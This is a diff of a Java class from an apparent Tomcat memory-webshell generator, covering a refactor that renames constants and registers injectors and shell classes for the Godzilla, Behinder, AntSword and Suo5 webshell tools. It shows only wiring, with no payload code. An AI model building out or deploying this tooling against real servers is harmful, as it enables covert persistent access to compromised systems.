@@ -1,6 +1,7 @@
 package com.reajason.javaweb.memshell.server;
 
 import com.reajason.javaweb.memshell.ShellTool;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.generator.ListenerGenerator;
 import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
 import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
@@ -30,9 +31,6 @@ import static com.reajason.javaweb.memshell.ShellType.*;
  * @since 2024/11/22
  */
 public class TomcatShell extends AbstractShell {
-    public static final String WEBSOCKET = "WebSocket";
-    public static final String UPGRADE = "Upgrade";
-    public static final String EXECUTOR = "Executor";
 
     public static class ListenerInterceptor {
 
@@ -57,8 +55,8 @@ public class TomcatShell extends AbstractShell {
                 .addInjector(JAKARTA_LISTENER, TomcatListenerInjector.class)
                 .addInjector(VALVE, TomcatValveInjector.class)
                 .addInjector(JAKARTA_VALVE, TomcatValveInjector.class)
-                .addInjector(AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
-                .addInjector(AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
+                .addInjector(ShellType.AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
+                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                 .addInjector(WEBSOCKET, TomcatWebSocketInjector.class)
                 .build();
     }
@@ -75,8 +73,8 @@ public class TomcatShell extends AbstractShell {
                 .addShellClass(JAKARTA_LISTENER, commandListenerClass)
                 .addShellClass(VALVE, CommandValve.class)
                 .addShellClass(JAKARTA_VALVE, CommandValve.class)
-                .addShellClass(AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
-                .addShellClass(AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
+                .addShellClass(ShellType.AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
+                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                 .addShellClass(WEBSOCKET, CommandWebSocket.class)
                 .build());
 
@@ -90,8 +88,8 @@ public class TomcatShell extends AbstractShell {
                 .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
                 .addShellClass(VALVE, GodzillaValve.class)
                 .addShellClass(JAKARTA_VALVE, GodzillaValve.class)
-                .addShellClass(AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
-                .addShellClass(AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
+                .addShellClass(ShellType.AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
+                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                 .build());
 
         Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Behinder);
@@ -104,8 +102,8 @@ public class TomcatShell extends AbstractShell {
                 .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
                 .addShellClass(VALVE, BehinderValve.class)
                 .addShellClass(JAKARTA_VALVE, BehinderValve.class)
-                .addShellClass(AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
-                .addShellClass(AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
+                .addShellClass(ShellType.AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
+                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                 .build());
 
         Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Suo5);
@@ -126,8 +124,8 @@ public class TomcatShell extends AbstractShell {
                 .addShellClass(FILTER, AntSwordFilter.class)
                 .addShellClass(LISTENER, antSwordListenerClass)
                 .addShellClass(VALVE, AntSwordValve.class)
-                .addShellClass(AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
-                .addShellClass(AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
+                .addShellClass(ShellType.AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
+                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                 .build());
     }
 }
